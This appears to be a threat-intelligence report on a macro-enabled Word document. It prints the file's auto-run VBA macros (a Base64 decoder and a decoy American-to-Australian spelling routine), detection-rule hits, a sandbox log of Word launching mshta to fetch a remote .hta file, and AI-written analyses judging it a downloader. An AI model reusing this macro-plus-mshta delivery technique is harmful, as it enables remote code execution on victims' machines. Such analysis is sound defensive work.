trid.file_type: Word Microsoft Office Open XML Format document (with Macro)
Word Microsoft Office Open XML Format document

macros.vba_code:
Private Sub Document_Open()
NewMacros.Dinosaur
End Sub

Sub Dinosaur()
'
' Dinosaur Macro
'
'
    American2Australian
End Sub
' Decodes a base-64 encoded string (BSTR type).
' 1999 - 2004 Antonin Foller, http://www.motobit.com
' 1.01 - solves problem with Access And 'Compare Database' (InStr)
Function Base64Decode(ByVal base64String)
  'rfc1521
  '1999 Antonin Foller, Motobit Software, http://Motobit.cz
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin
  
  base64String = Replace(base64String, vbCrLf, "")
  base64String = Replace(base64String, vbTab, "")
  base64String = Replace(base64String, " ", "")
  
  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, "Base64Decode", "Bad Base64 string."
    Exit Function
  End If

  
  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3

      thisChar = Mid(base64String, groupBegin + CharCounter, 1)

      If thisChar = "=" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
        Exit Function
      End If

      nGroup = 64 * nGroup + thisData
    Next
    
    nGroup = Hex(nGroup)
    
    nGroup = String(6 - Len(nGroup), "0") & nGroup
    
    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 5, 2)))
    
    sOut = sOut & Left(pOut, numDataBytes)
  Next

  Base64Decode = sOut
End Function

Sub American2Australian()
'
' Change commonly spelt words from American English to Australia
' Tested with MS Word 2016 on Windows
'
    Dim myDict: Set myDict = CreateObject("Scripting.Dictionary")
    myDict("analyze") = "analyze"
    myDict("analyzes") = "analyzes"
    myDict("behavior") = "

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

sigma_analysis_results.rule_title: Remotely Hosted HTA File Executed Via Mshta.EXE
sigma_analysis_results.rule_description: Detects execution of the "mshta" utility with an argument containing the "http" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file

match_context.values: @{Product=Internet Explorer; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=MSHTA.EXE; Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; Description=Microsoft (R) HTML Application host; EventID=1; ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\Bruno\Desktop\69345cd3b2a9ce7d338.docx.doc" /q; CommandLine=mshta https://tdalpacafarm.com/files/kr/contents/Vkggy0.hta; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Potential Suspicious Browser Launch From Document Reader Process
sigma_analysis_results.rule_description: Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.

match_context.values: @{Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=MSHTA.EXE; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; EventID=1; ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\Bruno\Desktop\69345cd3b2a9ce7d338.docx.doc" /q; CommandLine=mshta https://tdalpacafarm.com/files/kr/contents/Vkggy0.hta; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\mshta.exe; Company=Microsoft Corporation}

threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_ai_results.analysis:
The provided macros exhibit several behaviors that are indicative of malicious intent. 

1. Base64 Decoding Functionality: The `Base64Decode` function is designed to decode Base64 encoded strings. While decoding itself is not inherently malicious, it can be used to obfuscate the actual content or payload being executed. This raises a red flag as it suggests that the macro may be hiding its true intentions.

2. Suspicious URL Execution: The `AutoOpen()` subroutine contains a command to execute a shell command that opens a URL using `mshta`. This is particularly concerning because it points to an external resource (`https://tdalpacafarm.com/files/kr/contents/Vkggy0.hta`). Such behavior is often associated with downloading and executing potentially harmful scripts or executables from the internet, which is a common tactic used by malware to establish persistence or further compromise the system.

3. Manipulation of Document Content: The `American2Australian()` subroutine appears benign at first glance, as it changes American English spellings to Australian ones. However, this could serve as a distraction or decoy to mask more malicious activities occurring in other parts of the code.

4. Use of Scripting.Dictionary: The use of `Scripting.Dictionary` for word replacement indicates manipulation of document content, which could be leveraged for various purposes, including data exfiltration or altering document integrity without user consent.

5. Obfuscation and Misleading Comments: The comments within the code suggest benign functionality (e.g., changing spelling), but they do not align with the overall suspicious behavior exhibited by the macros. This discrepancy between comments and actual functionality is a classic sign of obfuscation intended to mislead analysts.

6. Potential for Persistence: The execution of external scripts via `Shell` commands can lead to persistent threats if those scripts contain instructions to install additional malware or create backdoors.

In conclusion, the combination of Base64 decoding, external script execution, and potential obfuscation leads to the determination that these macros are indeed malicious in nature. They demonstrate clear indicators of malware behavior, warranting a classification of "Malicious."

This macro code, when executed, will first trigger the `AutoOpen` subroutine due to its name.  The `AutoOpen` subroutine will attempt to execute a command that downloads and runs an external file. The command utilizes `mshta.exe`, a legitimate Windows program, to download a file from the internet and run it as an HTML Application (.hta) file. This is a common technique used by malicious actors to execute arbitrary code. 

The main subroutine, `Dinosaur`, calls the `American2Australian` subroutine. This subroutine declares a dictionary object and populates it with a list of words commonly spelled differently in American and Australian English. The subroutine then iterates through this dictionary, utilizing the `change_words` subroutine to find and replace all instances of American spellings with Australian spellings in the active document. This subroutine utilizes the `Selection.Find` object to perform a find and replace operation, replacing all occurrences of each American spelling with its Australian counterpart. 

The code also includes a `Base64Decode` function. This function is not explicitly used in any of the other subroutines provided, however, it is a common technique employed by malicious actors to obfuscate their code.
